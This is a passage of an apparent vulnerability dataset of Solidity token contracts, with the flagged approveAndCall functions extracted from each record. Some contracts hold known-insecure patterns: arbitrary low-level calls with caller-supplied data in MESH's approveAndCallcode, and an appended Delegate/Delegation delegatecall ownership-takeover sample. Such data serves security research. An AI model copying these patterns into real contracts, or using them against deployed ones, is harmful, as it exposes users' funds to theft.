    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) public returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nrequire(_spender.call(bytes4(bytes32(keccak256(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData));\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db5fcb296bdecdb1487"
  },
  "filename": "31696.sol",
  "content": "pragma solidity ^0.4.8;\ncontract Token {\n uint256 public totalSupply;\n function balanceOf(address _owner) public view returns (uint256 balance);\n function transfer(address _to, uint256 _value) public returns (bool success);\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool success);\n function approve(address _spender, uint256 _value) public returns (bool success);\n function allowance(address _owner, address _spender) public view returns (uint256 remaining);\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n uint256 constant MAX_UINT256 = 2**256 - 1;\n function transfer(address _to, uint256 _value) public returns (bool success) {\n require(balances[msg.sender] >= _value);\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n }\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {\n uint256 allowance = allowed[_from][msg.sender];\n require(balances[_from] >= _value && allowance >= _value);\n balances[_to] += _value;\n balances[_from] -= _value;\n if (allowance < MAX_UINT256) {\n allowed[_from][msg.sender] -= _value;\n }\n Transfer(_from, _to, _value);\n return true;\n }\n function balanceOf(address _owner) view public returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) public returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender)\n view public returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n}\ncontract HumanStandardToken is StandardToken {\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H0.1';\n function HumanStandardToken(\n uint256 _initialAmount,\n string _tokenName,\n uint8 _decimalUnits,\n string _tokenSymbol\n ) public {\n balances[msg.sender] = _initialAmount;\n totalSupply = _initialAmount;\n name = _tokenName;\n decimals = _decimalUnits;\n symbol = _tokenSymbol;\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) public returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n require(_spender.call(bytes4(bytes32(keccak256(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData));\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) public returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nrequire(_spender.call(bytes4(bytes32(keccak256(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData));\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db5fcb296bdecdb1488"
  },
  "filename": "31697.sol",
  "content": "pragma solidity ^0.4.4;\ncontract SafeMath {\n function safeMul(uint a, uint b) internal returns (uint) {\n uint c = a * b;\n assert(a == 0 || c / a == b);\n return c;\n }\n function safeDiv(uint a, uint b) internal returns (uint) {\n assert(b > 0);\n uint c = a / b;\n assert(a == b * c + a % b);\n return c;\n }\n function safeSub(uint a, uint b) internal returns (uint) {\n assert(b <= a);\n return a - b;\n }\n function safeAdd(uint a, uint b) internal returns (uint) {\n uint c = a + b;\n assert(c>=a && c>=b);\n return c;\n }\n function max64(uint64 a, uint64 b) internal constant returns (uint64) {\n return a >= b ? a : b;\n }\n function min64(uint64 a, uint64 b) internal constant returns (uint64) {\n return a < b ? a : b;\n }\n function max256(uint256 a, uint256 b) internal constant returns (uint256) {\n return a >= b ? a : b;\n }\n function min256(uint256 a, uint256 b) internal constant returns (uint256) {\n return a < b ? a : b;\n }\n function assert(bool assertion) internal {\n if (!assertion) {\n throw;\n }\n }\n}\ncontract Token is SafeMath {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] = safeSub(balances[msg.sender],_value);\n balances[_to] = safeAdd(balances[_to],_value);\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] =safeAdd(balances[_to],_value);\n balances[_from] =safeSub(balances[_from],_value);\n allowed[_from][msg.sender] = safeSub(allowed[_from][msg.sender],_value);\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply= 4500000*10**12;\n uint256 public initialSupply= 2500000*10**12;\n}\ncontract HawalaToken is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'HAT';\n function HawalaToken(\n ) {\n totalSupply+=initialSupply;\n balances[msg.sender] = initialSupply;\n name = \"HawalaToken\";\n decimals = 12;\n symbol = \"HAT\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db5fcb296bdecdb1489"
  },
  "filename": "317.sol",
  "content": "pragma solidity ^0.4.18;\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n if (a == 0) {\n return 0;\n }\n uint256 c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a / b;\n return c;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract eastadscredits is StandardToken {\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n uint256 public unitsOneEthCanBuy;\n uint256 public totalEthInWei;\n address public fundsWallet;\n function eastadscredits() {\n balances[msg.sender] = 700000000000000000000000000;\n totalSupply = 700000000000000000000000000;\n name = \"Eastads Credits\";\n decimals = 18;\n symbol = \"ECR\";\n unitsOneEthCanBuy = 70000;\n fundsWallet = msg.sender;\n }\n function() payable{\n totalEthInWei = totalEthInWei + msg.value;\n uint256 amount = msg.value * unitsOneEthCanBuy;\n require(balances[fundsWallet] >= amount);\n balances[fundsWallet] = balances[fundsWallet] - amount;\n balances[msg.sender] = balances[msg.sender] + amount;\n Transfer(fundsWallet, msg.sender, amount);\n fundsWallet.transfer(msg.value);\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(keccak256(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { revert(); }\n return true;\n }\n}\ncontract Delegate {\n address public owner;\n function Delegate(address _owner) {\n owner = _owner;\n }\n function pwn() {\n owner = msg.sender;\n }\n}\ncontract Delegation {\n address public owner;\n Delegate delegate;\n function Delegation(address _delegateAddress) {\n delegate = Delegate(_delegateAddress);\n owner = msg.sender;\n }\n function() {\n if(delegate.delegatecall(msg.data)) {\n this;\n }\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(keccak256(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { revert(); }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db5fcb296bdecdb148a"
  },
  "filename": "31737.sol",
  "content": "pragma solidity ^0.4.18;\ncontract Token {\n uint256 public totalSupply;\n function balanceOf(address _owner) public constant returns (uint256 balance);\n function transfer(address _to, uint256 _value) public returns (bool success);\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool success);\n function approve(address _spender, uint256 _value) public returns (bool success);\n function allowance(address _owner, address _spender) public constant returns (uint256 remaining);\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract Owned {\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n address public owner;\n function Owned() public {\n owner = msg.sender;\n }\n address newOwner=0x0;\n event OwnerUpdate(address _prevOwner, address _newOwner);\n function changeOwner(address _newOwner) public onlyOwner {\n require(_newOwner != owner);\n newOwner = _newOwner;\n }\n function acceptOwnership() public{\n require(msg.sender == newOwner);\n OwnerUpdate(owner, newOwner);\n owner = newOwner;\n newOwner = 0x0;\n }\n}\ncontract Controlled is Owned{\n function Controlled() public {\n setExclude(msg.sender);\n }\n bool public transferEnabled = false;\n bool lockFlag=true;\n mapping(address => bool) locked;\n mapping(address => bool) exclude;\n function enableTransfer(bool _enable) public onlyOwner{\n transferEnabled=_enable;\n }\n function disableLock(bool _enable) public onlyOwner returns (bool success){\n lockFlag=_enable;\n return true;\n }\n function addLock(address _addr) public onlyOwner returns (bool success){\n require(_addr!=msg.sender);\n locked[_addr]=true;\n return true;\n }\n function setExclude(address _addr) public onlyOwner returns (bool success){\n exclude[_addr]=true;\n return true;\n }\n function removeLock(address _addr) public onlyOwner returns (bool success){\n locked[_addr]=false;\n return true;\n }\n modifier transferAllowed(address _addr) {\n if (!exclude[_addr]) {\n assert(transferEnabled);\n if(lockFlag){\n assert(!locked[_addr]);\n }\n }\n _;\n }\n}\ncontract StandardToken is Token,Controlled {\n function transfer(address _to, uint256 _value) public transferAllowed(msg.sender) returns (bool success) {\n if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) public transferAllowed(_from) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) public constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) public returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) public constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n}\ncontract MESH is StandardToken {\n function () public {\n revert();\n }\n string public name = \"M2C Mesh Network\";\n uint8 public decimals = 18;\n string public symbol = \"mesh\";\n mapping(address => uint256) nonces;\n function MESH (uint256 initialSupply) public {\n totalSupply = initialSupply * 10 ** uint256(decimals);\n balances[msg.sender] = totalSupply;\n }\n function transferProxy(address _from, address _to, uint256 _value, uint256 _fee,\n uint8 _v,bytes32 _r, bytes32 _s) public transferAllowed(_from) returns (bool){\n if(balances[_from] < _fee + _value) revert();\n uint256 nonce = nonces[_from];\n bytes32 h = keccak256(_from,_to,_value,_fee,nonce);\n if(_from != ecrecover(h,_v,_r,_s)) revert();\n if(balances[_to] + _value < balances[_to]\n || balances[msg.sender] + _fee < balances[msg.sender]) revert();\n balances[_to] += _value;\n Transfer(_from, _to, _value);\n balances[msg.sender] += _fee;\n Transfer(_from, msg.sender, _fee);\n balances[_from] -= _value + _fee;\n nonces[_from] = nonce + 1;\n return true;\n }\n function approveProxy(address _from, address _spender, uint256 _value,\n uint8 _v,bytes32 _r, bytes32 _s) public returns (bool success) {\n uint256 nonce = nonces[_from];\n bytes32 hash = keccak256(_from,_spender,_value,nonce);\n if(_from != ecrecover(hash,_v,_r,_s)) revert();\n allowed[_from][_spender] = _value;\n Approval(_from, _spender, _value);\n nonces[_from] = nonce + 1;\n return true;\n }\n function getNonce(address _addr) public constant returns (uint256){\n return nonces[_addr];\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) public returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(keccak256(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { revert(); }\n return true;\n }\n function approveAndCallcode(address _spender, uint256 _value, bytes _extraData) public returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(_extraData)) { revert(); }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) public returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(keccak256(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { revert(); }\nreturn true;\n}",
    "function approveAndCallcode(address _spender, uint256 _value, bytes _extraData) public returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(_extraData)) { revert(); }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db5fcb296bdecdb148b"
  },
  "filename": "31753.sol",
  "content": "pragma solidity ^0.4.8;\ncontract Token{\n uint256 public totalSupply;\n function balanceOf(address _owner) constant returns (uint256 balance);\n function allowance(address _owner, address _spender) constant returns (uint256 remaining);\n function transfer(address _to, uint256 _value) returns (bool success);\n function approve(address _spender, uint256 _value) returns (bool success);\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success);\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n function transfer(address _to, uint256 _value) returns (bool success) {\n require(balances[msg.sender] >= _value);\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n }\n function approve(address _spender, uint256 _value) returns (bool success)\n {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n require(balances[_from] >= _value && allowed[_from][msg.sender] >= _value);\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n}\ncontract CCToken is StandardToken {\n string public name;\n uint8 public decimals;\n string public symbol;\n function CCToken() {\n balances[msg.sender] = 10000000000000000;\n totalSupply = 10000000000000000;\n name = \"Coin Coming Token\";\n decimals = 8;\n symbol = \"CCT\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))),\n msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n function () {\n throw;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))),\nmsg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db5fcb296bdecdb148c"
  },
  "filename": "31760.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract NBSToken is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function NBSToken(\n ) {\n balances[msg.sender] = 4000000000000000;\n totalSupply = 4000000000000000;\n name = \"NBS\";\n decimals = 6;\n symbol = \"NBS\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db5fcb296bdecdb148d"
  },
  "filename": "31783.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract ERC20Token is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function ERC20Token(\n ) {\n balances[msg.sender] = 1000000000000000000000000000;\n totalSupply = 1000000000000000000000000000;\n name = \"Fastbit\";\n decimals = 18;\n symbol = \"FAST\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db5fcb296bdecdb148e"
  },
  "filename": "31827.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract ERC20Token is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function ERC20Token(\n ) {\n balances[msg.sender] = 1000000;\n totalSupply = 1000000;\n name = \"GoldCoin\";\n decimals = 0;\n symbol = \"GDC\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db5fcb296bdecdb148f"
  },
  "filename": "31859.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract ERC20ReelToken is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function ERC20ReelToken(\n ) {\n balances[msg.sender] = 2017;\n totalSupply = 2017;\n name = \"ReelCoin\";\n decimals = 0;\n symbol = \"REEL\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db5fcb296bdecdb1490"
  },
  "filename": "31873.sol",
